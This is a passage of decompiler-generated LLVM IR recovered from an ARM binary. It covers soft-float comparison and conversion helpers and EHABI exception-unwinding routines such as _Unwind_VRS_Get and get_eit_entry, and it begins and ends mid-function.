  uselistorder i32* %r4.global-to-local, { 8, 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 9, 10, 7, 8, 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 9, 0, 6, 7, 1, 2, 3, 4, 5, 8 }
  uselistorder i32* %ip.global-to-local, { 8, 6, 7, 9, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_17c88, { 2, 1, 0 }
  uselistorder i32 ()* @function_17af4, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* @cpsr_v, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 1024, { 3, 0, 14, 1, 15, 4, 16, 2, 11, 12, 13, 5, 6, 7, 9, 10, 8 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 33, { 3, 4, 5, 1, 6, 7, 2, 0 }
  uselistorder i32 768, { 2, 0, 1 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 1048576, { 22, 0, 1, 2, 23, 24, 13, 3, 4, 5, 25, 6, 7, 26, 27, 16, 17, 8, 9, 28, 29, 30, 19, 31, 10, 14, 11, 18, 12, 20, 15, 21 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_17e84, { 1, 0 }
  uselistorder label %dec_label_pc_17e68, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_17e34, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_17d24, { 1, 0 }
  uselistorder label %dec_label_pc_17d0c, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_17ea8 = call i32 @function_17eb8()
  ret i32 %v0_17ea8
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_17eb0 = call i32 @function_17eb8()
  ret i32 %v0_17eb0

; uselistorder directives
  uselistorder i32 ()* @function_17eb8, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_17eb4 = load i32, i32* @r0, align 4
  ret i32 %v0_17eb4
}

define i32 @function_17eb8() local_unnamed_addr {
dec_label_pc_17eb8:
  %v0_17eb8 = load i32, i32* @ip, align 4
  %v0_17ebc = load i32, i32* @r1, align 4
  %v2_17ebc = mul i32 %v0_17ebc, 2
  %v2_17ebc.off = add i32 %v2_17ebc, 4194303
  %tmp = icmp ult i32 %v2_17ebc.off, 2097152
  %v0_17ec4 = load i32, i32* @r3, align 4
  %v2_17ec4 = mul i32 %v0_17ec4, 2
  br i1 %tmp, label %dec_label_pc_17f14, label %bb

bb:                                               ; preds = %dec_label_pc_17eb8
  %v2_17ec4.off = add i32 %v2_17ec4, 4194303
  %tmp21 = icmp ult i32 %v2_17ec4.off, 2097152
  br i1 %tmp21, label %dec_label_pc_17f08, label %dec_label_pc_17ed0

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17f1c, %dec_label_pc_17f28, %bb
  %v0_17ed0 = load i32, i32* @r0, align 4
  %v4_17ed0 = or i32 %v0_17ed0, %v2_17ebc
  %v6_17ed0 = icmp eq i32 %v4_17ed0, 0
  br i1 %v6_17ed0, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_17ed0
  %v1_17ed4 = load i32, i32* @r2, align 4
  %v5_17ed4 = or i32 %v1_17ed4, %v2_17ec4
  %v7_17ed4 = icmp eq i32 %v5_17ed4, 0
  br i1 %v7_17ed4, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_17ed0, %bb10
  %v5_17ed8 = icmp eq i32 %v0_17ec4, %v0_17ebc
  br i1 %v5_17ed8, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_17edc.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_17edc = phi i32 [ %v2_17edc.pre, %.thread..thread1_crit_edge ], [ %v1_17ed4, %bb10 ]
  %v5_17edc = icmp eq i32 %v2_17edc, %v0_17ed0
  br i1 %v5_17edc, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_17ee4 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_17ee4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_17ee4, i32 %v0_17ee4)
  %v0_17ee8 = load i32, i32* @r0, align 4
  %v0_17eec = load i32, i32* @r1, align 4
  %v1_17eec = load i32, i32* @r3, align 4
  %v2_17eec = xor i32 %v1_17eec, %v0_17eec
  %v3_17eec = icmp slt i32 %v2_17eec, 0
  br i1 %v3_17eec, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_17ef0 = icmp eq i32 %v0_17eec, %v1_17eec
  br i1 %v10_17ef0, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_17ef4 = load i32, i32* @r2, align 4
  %v4_17ef4 = icmp ult i32 %v0_17ee8, %v2_17ef4
  br i1 %v4_17ef4, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_17ef0 = icmp ult i32 %v0_17eec, %v1_17eec
  br i1 %v4_17ef0, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_17eec, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_17ef8 = and i32 %v1_17eec, 1073741824
  %v3_17ef8 = icmp eq i32 %v2_17ef8, 0
  %v4_17ef8 = ashr i32 %v1_17eec, 31
  br i1 %v3_17ef8, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_17efc.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_17ef8, %bb15 ]
  %v5_17efc = sub nsw i32 -1, %v4_17efc.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_17f00 = phi i32 [ %v4_17ef8, %bb15 ], [ %v5_17efc, %.thread3 ]
  %v1_17f00 = or i32 %v0_17f00, 1
  ret i32 %v1_17f00

dec_label_pc_17f08:                               ; preds = %bb
  br label %dec_label_pc_17f1c

dec_label_pc_17f14:                               ; preds = %dec_label_pc_17eb8
  %v0_17f14 = load i32, i32* @r0, align 4
  %v4_17f14 = mul i32 %v0_17ebc, 4096
  %v5_17f14 = or i32 %v0_17f14, %v4_17f14
  %v7_17f14 = icmp eq i32 %v5_17f14, 0
  br i1 %v7_17f14, label %dec_label_pc_17f14.dec_label_pc_17f1c_crit_edge, label %dec_label_pc_17f30

dec_label_pc_17f14.dec_label_pc_17f1c_crit_edge:  ; preds = %dec_label_pc_17f14
  %v2_17ec4.off20 = add i32 %v2_17ec4, 4194303
  %tmp22 = icmp ult i32 %v2_17ec4.off20, 2097152
  br label %dec_label_pc_17f1c

dec_label_pc_17f1c:                               ; preds = %dec_label_pc_17f14.dec_label_pc_17f1c_crit_edge, %dec_label_pc_17f08
  %v3_17f20.pre-phi = phi i1 [ %tmp22, %dec_label_pc_17f14.dec_label_pc_17f1c_crit_edge ], [ true, %dec_label_pc_17f08 ]
  br i1 %v3_17f20.pre-phi, label %dec_label_pc_17f28, label %dec_label_pc_17ed0

dec_label_pc_17f28:                               ; preds = %dec_label_pc_17f1c
  %v0_17f28 = load i32, i32* @r2, align 4
  %v4_17f28 = mul i32 %v0_17ec4, 4096
  %v5_17f28 = or i32 %v0_17f28, %v4_17f28
  %v7_17f28 = icmp eq i32 %v5_17f28, 0
  br i1 %v7_17f28, label %dec_label_pc_17ed0, label %dec_label_pc_17f30

dec_label_pc_17f30:                               ; preds = %dec_label_pc_17f14, %dec_label_pc_17f28
  ret i32 %v0_17eb8

; uselistorder directives
  uselistorder i32 %v4_17ef8, { 1, 0 }
  uselistorder i32 %v1_17eec, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_17eec, { 2, 1, 0 }
  uselistorder i32 %v1_17ed4, { 1, 0 }
  uselistorder i32 %v2_17ec4, { 0, 2, 1 }
  uselistorder i32 %v0_17ec4, { 1, 0, 2 }
  uselistorder i32 %v2_17ebc, { 1, 0 }
  uselistorder i32 %v0_17ebc, { 1, 0, 2 }
  uselistorder i32 31, { 9, 4, 2, 5, 6, 10, 3, 11, 12, 7, 8, 1, 14, 0, 15, 16, 17, 18, 13 }
  uselistorder label %dec_label_pc_17f30, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_17ed0, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_17f38 = load i32, i32* @r0, align 4
  %v0_17f3c = load i32, i32* @r2, align 4
  store i32 %v0_17f3c, i32* @r0, align 4
  store i32 %v0_17f38, i32* @r2, align 4
  %v0_17f50 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_17f50
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_17f54 = load i32, i32* @r0, align 4
  %v1_17f58 = sext i32 %v3_17f54 to i64
  %v2_17f58 = bitcast i64 %v1_17f58 to double
  %v3_17f58 = load i32, i32* @r2, align 4
  %v4_17f58 = sext i32 %v3_17f58 to i64
  %v5_17f58 = bitcast i64 %v4_17f58 to double
  %v7_17f58 = fcmp oeq double %v2_17f58, %v5_17f58
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_17f58 = fcmp ule double %v2_17f58, %v5_17f58
  %not.v7_17f58 = xor i1 %v7_17f58, true
  %v1_17f5c = and i1 %not.v6_17f58, %not.v7_17f58
  store i1 %v7_17f58, i1* @cpsr_z, align 1
  br i1 %v1_17f5c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_17f58, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_17f54

; uselistorder directives
  uselistorder i1 %v7_17f58, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_17f70 = call i32 @__aeabi_cdcmple()
  %v0_17f74 = load i1, i1* @cpsr_z, align 1
  %.v0_17f70. = zext i1 %v0_17f74 to i32
  ret i32 %.v0_17f70.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_17f88 = call i32 @__aeabi_cdcmple()
  %v0_17f8c = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_17f8c to i32
  %.v0_17f88. = xor i32 %tmp2, 1
  ret i32 %.v0_17f88.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_17fa0 = call i32 @__aeabi_cdcmple()
  %v0_17fa4 = load i1, i1* @cpsr_z, align 1
  %v1_17fa4 = load i1, i1* @cpsr_c, align 1
  %v2_17fa4 = xor i1 %v1_17fa4, true
  %v3_17fa4 = or i1 %v0_17fa4, %v2_17fa4
  %.v0_17fa0 = select i1 %v3_17fa4, i32 1, i32 %v0_17fa0
  %v2_17fa8 = xor i1 %v0_17fa4, true
  %v3_17fa8 = and i1 %v1_17fa4, %v2_17fa8
  %..v0_17fa0 = select i1 %v3_17fa8, i32 0, i32 %.v0_17fa0
  ret i32 %..v0_17fa0

; uselistorder directives
  uselistorder i1 %v1_17fa4, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_17fb4 = load i32, i32* @lr, align 4
  store i32 %v0_17fb4, i32* %stack_var_-8, align 4
  %v0_17fb8 = call i32 @__aeabi_cdrcmple()
  %v0_17fbc = load i1, i1* @cpsr_z, align 1
  %v1_17fbc = load i1, i1* @cpsr_c, align 1
  %v2_17fbc = xor i1 %v1_17fbc, true
  %v3_17fbc = or i1 %v0_17fbc, %v2_17fbc
  %.v0_17fb8 = select i1 %v3_17fbc, i32 1, i32 %v0_17fb8
  %v2_17fc0 = xor i1 %v0_17fbc, true
  %v3_17fc0 = and i1 %v1_17fbc, %v2_17fc0
  %..v0_17fb8 = select i1 %v3_17fc0, i32 0, i32 %.v0_17fb8
  %v2_17fc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17fc4, i32* @lr, align 4
  ret i32 %..v0_17fb8

; uselistorder directives
  uselistorder i1 %v1_17fbc, { 1, 0 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_17fd0 = call i32 @__aeabi_cdrcmple()
  %v0_17fd4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_17fd4 to i32
  %.v0_17fd0. = xor i32 %tmp2, 1
  ret i32 %.v0_17fd0.

; uselistorder directives
  uselistorder i1* @cpsr_c, { 0, 6, 1, 7, 8, 9, 2, 3, 4, 5 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_17fe4 = icmp slt i32 %arg2, 0
  %v2_17fe4 = mul i32 %arg2, 2
  br i1 %v1_17fe4, label %dec_label_pc_18018, label %dec_label_pc_17fec

dec_label_pc_17fec:                               ; preds = %entry
  %v1_17fec = add i32 %v2_17fe4, 2097152
  %v2_17fec = icmp ugt i32 %v2_17fe4, -2097153
  br i1 %v2_17fec, label %dec_label_pc_18020, label %dec_label_pc_17ff4

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17fec
  %v6_17fec = icmp slt i32 %v1_17fec, 0
  br i1 %v6_17fec, label %dec_label_pc_17ff8, label %dec_label_pc_18018

dec_label_pc_17ff8:                               ; preds = %dec_label_pc_17ff4
  %v4_17ffc = sdiv i32 %v1_17fec, 2097152
  %v5_17ffc = sub nsw i32 -993, %v4_17ffc
  %v11_17ffc = icmp slt i32 %v5_17ffc, 0
  br i1 %v11_17ffc, label %dec_label_pc_18028, label %dec_label_pc_18004

dec_label_pc_18004:                               ; preds = %dec_label_pc_17ff8
  %v3_18004 = mul i32 %arg2, 2048
  %v4_1800c = udiv i32 %arg1, 2097152
  %v1_18008 = or i32 %v4_1800c, %v3_18004
  %v5_1800c = or i32 %v1_18008, -2147483648
  %v6_18010 = lshr i32 %v5_1800c, %v5_17ffc
  ret i32 %v6_18010

dec_label_pc_18018:                               ; preds = %dec_label_pc_17ff4, %entry
  ret i32 0

dec_label_pc_18020:                               ; preds = %dec_label_pc_17fec
  %v4_18020 = mul i32 %arg2, 4096
  %v5_18020 = or i32 %v4_18020, %arg1
  %v7_18020 = icmp eq i32 %v5_18020, 0
  br i1 %v7_18020, label %dec_label_pc_18028, label %dec_label_pc_18030

dec_label_pc_18028:                               ; preds = %dec_label_pc_18020, %dec_label_pc_17ff8
  ret i32 -1

dec_label_pc_18030:                               ; preds = %dec_label_pc_18020
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_18038 = icmp eq i32 %regclass, 0
  br i1 %v2_18038, label %dec_label_pc_18040, label %dec_label_pc_18070

dec_label_pc_18040:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18040
  %v6_18044 = icmp eq i32 %representation, 0
  br i1 %v6_18044, label %dec_label_pc_18054, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18040
  br label %dec_label_pc_1807c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1807c

dec_label_pc_18054:                               ; preds = %bb
  %v3_18054 = mul i32 %regno, 4
  %v2_18058 = add i32 %v3_18054, %context
  %v1_1805c = add i32 %v2_18058, 4
  %v2_1805c = inttoptr i32 %v1_1805c to i32*
  %v3_1805c = load i32, i32* %v2_1805c, align 4
  %v2_18068 = bitcast i8* %valuep to i32*
  store i32 %v3_1805c, i32* %v2_18068, align 4
  ret i32 0

dec_label_pc_18070:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_18070
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18070, %bb9
  %v0_18078 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_18078)
  br label %dec_label_pc_1807c

dec_label_pc_1807c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1807c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_18084 = icmp eq i32 %regclass, 0
  br i1 %v2_18084, label %dec_label_pc_1808c, label %dec_label_pc_180bc

dec_label_pc_1808c:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1808c
  %v6_18090 = icmp eq i32 %representation, 0
  br i1 %v6_18090, label %dec_label_pc_180a0, label %bb8

.thread3:                                         ; preds = %dec_label_pc_1808c
  br label %dec_label_pc_180c8

bb8:                                              ; preds = %bb
  br label %dec_label_pc_180c8

dec_label_pc_180a0:                               ; preds = %bb
  %v3_180a4 = mul i32 %regno, 4
  %v1_180a8 = bitcast i8* %valuep to i32*
  %v2_180a8 = load i32, i32* %v1_180a8, align 4
  %v2_180ac = add i32 %v3_180a4, %context
  %v2_180b4 = add i32 %v2_180ac, 4
  %v3_180b4 = inttoptr i32 %v2_180b4 to i32*
  store i32 %v2_180a8, i32* %v3_180b4, align 4
  ret i32 0

dec_label_pc_180bc:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_180bc
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_180bc, %bb9
  %v0_180c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_180c4)
  br label %dec_label_pc_180c8

dec_label_pc_180c8:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_180c8, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_180d0 = add i32 %context, 68
  %v2_180d0 = inttoptr i32 %v1_180d0 to i32*
  %v3_180d0 = load i32, i32* %v2_180d0, align 4
  ret i32 %v3_180d0

; uselistorder directives
  uselistorder i32 68, { 32, 0, 30, 1, 3, 7, 4, 8, 5, 9, 6, 10, 11, 12, 20, 21, 19, 22, 23, 24, 25, 26, 27, 14, 15, 16, 17, 13, 18, 2, 28, 29, 31 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_180e0 = add i32 %exc, 8
  %v2_180e0 = inttoptr i32 %v1_180e0 to i32*
  %v3_180e0 = load i32, i32* %v2_180e0, align 4
  %v2_180e4 = icmp eq i32 %v3_180e0, 0
  br i1 %v2_180e4, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_180f8 = xor i1 %v2_180e4, true
  call void @__pseudo_cond_branch(i1 %v2_180f8, i32 %v3_180e0)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18110 = call i32 @abort()
  ret i32 %v0_18110
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_1811c = call i32 @abort()
  ret i32 %v0_1811c
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_18120 = load i32, i32* @r4, align 4
  store i32 %v3_18120, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r5.global-to-local, align 4
  %v4_18130 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 140) to i32*), align 4
  %v2_18134 = icmp eq i32 %v4_18130, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_18140 = add i32 %return_address, -2
  store i32 %v1_18140, i32* %r4.global-to-local, align 4
  br i1 %v2_18134, label %dec_label_pc_18178, label %dec_label_pc_18148

dec_label_pc_18148:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_18130)
  %v2_18158 = icmp eq i32 %v1_18140, 0
  br i1 %v2_18158, label %.thread, label %dec_label_pc_18198thread-pre-split

.thread:                                          ; preds = %dec_label_pc_18148
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_18160 = load i32, i32* %r6.global-to-local, align 4
  %v3_18160 = add i32 %v2_18160, 16
  %v4_18160 = inttoptr i32 %v3_18160 to i32*
  store i32 0, i32* %v4_18160, align 4
  br label %dec_label_pc_18168

dec_label_pc_18168:                               ; preds = %.thread, %.thread10, %dec_label_pc_18310, %dec_label_pc_182fc, %dec_label_pc_182d8, %dec_label_pc_182b0, %dec_label_pc_181b0
  %v0_18168 = load i32, i32* %r2.global-to-local, align 4
  %v2_18170 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_18170, i32* @r4, align 4
  ret i32 %v0_18168

dec_label_pc_18178:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_18180 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 20) to i32*), align 4
  %v4_18184 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 52) to i32*), align 4
  store i32 %v4_18184, i32* %r2.global-to-local, align 4
  %v2_18188 = sub i32 %v4_18180, %v4_18184
  %v3_1818c = sdiv i32 %v2_18188, 8
  store i32 %v3_1818c, i32* %stack_var_-36, align 4
  br label %dec_label_pc_18198

dec_label_pc_18198thread-pre-split:               ; preds = %dec_label_pc_18148
  %v3_18198.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_18198

dec_label_pc_18198:                               ; preds = %dec_label_pc_18198thread-pre-split, %dec_label_pc_18178
  %v0_181dc.pre = phi i32 [ %v1_18140, %dec_label_pc_18198thread-pre-split ], [ %v4_18184, %dec_label_pc_18178 ]
  %v1_181a0 = phi i32 [ %v3_18198.pr, %dec_label_pc_18198thread-pre-split ], [ %v3_1818c, %dec_label_pc_18178 ]
  %v2_1819c = icmp eq i32 %v1_181a0, 0
  br i1 %v2_1819c, label %dec_label_pc_181b0, label %dec_label_pc_181cc.preheader

dec_label_pc_181cc.preheader:                     ; preds = %dec_label_pc_18198
  %v2_181a0 = add i32 %v1_181a0, -1
  %v1_181fc = add i32 %v0_181dc.pre, 8
  br label %dec_label_pc_181cc.outer

dec_label_pc_181b0.loopexit:                      ; preds = %dec_label_pc_18228
  br label %dec_label_pc_181b0

dec_label_pc_181b0:                               ; preds = %dec_label_pc_181b0.loopexit, %dec_label_pc_18198, %dec_label_pc_182f4
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_181b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_181b8 = add i32 %v1_181b8, 16
  %v3_181b8 = inttoptr i32 %v2_181b8 to i32*
  store i32 0, i32* %v3_181b8, align 4
  br label %dec_label_pc_18168

dec_label_pc_181c0:                               ; preds = %dec_label_pc_1821c
  %v3_181c0 = icmp ult i32 %storemerge40, %v0_18220
  br i1 %v3_181c0, label %dec_label_pc_181c8, label %dec_label_pc_18238

dec_label_pc_181c8:                               ; preds = %dec_label_pc_181c0
  %v1_181c8 = add nsw i32 %v3_181d4, 1
  br label %dec_label_pc_181cc.outer

dec_label_pc_181cc.outer:                         ; preds = %dec_label_pc_181c8, %dec_label_pc_181cc.preheader
  %v1_18228.ph = phi i32 [ %v1_181c8, %dec_label_pc_181c8 ], [ 0, %dec_label_pc_181cc.preheader ]
  %v0_181cc.ph = phi i32 [ %v0_181cc, %dec_label_pc_181c8 ], [ %v2_181a0, %dec_label_pc_181cc.preheader ]
  br label %dec_label_pc_181cc

dec_label_pc_181cc:                               ; preds = %dec_label_pc_181cc.outer, %dec_label_pc_18230
  %v0_181cc = phi i32 [ %v1_18230, %dec_label_pc_18230 ], [ %v0_181cc.ph, %dec_label_pc_181cc.outer ]
  %v2_181cc = add i32 %v0_181cc, %v1_18228.ph
  %tmp = icmp slt i32 %v2_181cc, 0
  %v4_181d0 = zext i1 %tmp to i32
  %v5_181d0 = add i32 %v4_181d0, %v2_181cc
  %v3_181d4 = sdiv i32 %v5_181d0, 2
  %v3_181d8 = mul i32 %v3_181d4, 8
  store i32 %v3_181d8, i32* @ip, align 4
  %v2_181dc = add i32 %v3_181d8, %v0_181dc.pre
  %v3_181dc = inttoptr i32 %v2_181dc to i32*
  %v4_181dc = load i32, i32* %v3_181dc, align 4
  %v1_181e0 = and i32 %v4_181dc, 1073741824
  %v2_181e0 = icmp eq i32 %v1_181e0, 0
  %v2_181e4 = or i32 %v4_181dc, -2147483648
  %tmp79 = bitcast i32 %v4_181dc to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_181e8 = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_181e0, i32 %v2_181e8, i32 %v2_181e4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_181ec = icmp eq i32 %v2_181a0, %v3_181d4
  store i32 %v2_181dc, i32* %r7.global-to-local, align 4
  br i1 %v9_181ec, label %dec_label_pc_1821c, label %dec_label_pc_181fc

dec_label_pc_181fc:                               ; preds = %dec_label_pc_181cc
  %v2_18200 = add i32 %v3_181d8, %v1_181fc
  %v3_18200 = inttoptr i32 %v2_18200 to i32*
  %v4_18200 = load i32, i32* %v3_18200, align 4
  %v1_18208 = and i32 %v4_18200, 1073741824
  %v2_18208 = icmp eq i32 %v1_18208, 0
  %v2_1820c = or i32 %v4_18200, -2147483648
  %tmp81 = bitcast i32 %v4_18200 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_18210 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_18208, i32 %v2_18210, i32 %v2_1820c
  %v1_18214 = add i32 %v2_18200, -1
  %v2_18218 = add i32 %storemerge39, %v1_18214
  br label %dec_label_pc_1821c

dec_label_pc_1821c:                               ; preds = %dec_label_pc_181cc, %dec_label_pc_181fc
  %storemerge40 = phi i32 [ %v2_18218, %dec_label_pc_181fc ], [ -1, %dec_label_pc_181cc ]
  %v2_1821c = add i32 %storemerge, %v2_181dc
  %v0_18220 = load i32, i32* %r4.global-to-local, align 4
  %v3_18220 = icmp ult i32 %v0_18220, %v2_1821c
  br i1 %v3_18220, label %dec_label_pc_18228, label %dec_label_pc_181c0

dec_label_pc_18228:                               ; preds = %dec_label_pc_1821c
  %v9_18228 = icmp eq i32 %v3_181d4, %v1_18228.ph
  br i1 %v9_18228, label %dec_label_pc_181b0.loopexit, label %dec_label_pc_18230

dec_label_pc_18230:                               ; preds = %dec_label_pc_18228
  %v1_18230 = add nsw i32 %v3_181d4, -1
  br label %dec_label_pc_181cc

dec_label_pc_18238:                               ; preds = %dec_label_pc_181c0
  %v2_18238 = load i32, i32* %v3_181dc, align 4
